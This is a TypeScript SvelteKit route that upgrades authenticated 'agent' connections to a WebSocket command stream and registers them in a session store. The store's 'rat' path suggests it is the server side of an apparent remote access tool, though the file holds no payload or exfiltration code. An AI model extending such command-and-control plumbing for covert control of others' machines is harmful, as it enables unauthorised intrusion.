import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import {
	COMMAND_STREAM_SUBPROTOCOL,
	AGENT_SESSION_TOKEN_HEADER
} from '../../../../../../../shared/constants/protocol';

function parseSubprotocolHeader(headerValue: string | null): string[] {
	if (!headerValue) {
		return [];
	}
	return headerValue
		.split(',')
		.map((value) => value.trim())
		.filter((value) => value !== '');
}

export const GET: RequestHandler = ({ request, params, getClientAddress }) => {
	if (request.headers.get('upgrade')?.toLowerCase() !== 'websocket') {
		throw error(400, 'Expected WebSocket upgrade request');
	}

	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const token = request.headers.get(AGENT_SESSION_TOKEN_HEADER);
	if (!token) {
		throw error(401, 'Missing session token');
	}

	const requestedProtocols = parseSubprotocolHeader(request.headers.get('sec-websocket-protocol'));
	if (!requestedProtocols.includes(COMMAND_STREAM_SUBPROTOCOL)) {
		throw error(426, 'Unsupported WebSocket protocol');
	}

	const pairFactory = (
		globalThis as {
			WebSocketPair?: new () => { 0: WebSocket; 1: WebSocket };
		}
	).WebSocketPair;

	if (!pairFactory) {
		console.warn(
			'WebSocketPair not found in globalThis. This environment might not support native SvelteKit WebSocket upgrades.'
		);
		throw error(503, 'WebSocket upgrade not supported on this platform');
	}

	const { 0: client, 1: serverSocket } = new pairFactory();

	try {
		registry.attachSession(id, token, serverSocket, { remoteAddress: getClientAddress() });
	} catch (err) {
		serverSocket.close(1008, 'Session rejected');
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to establish agent session');
	}

	return new Response(null, { status: 101, webSocket: client } as unknown as ResponseInit);
};
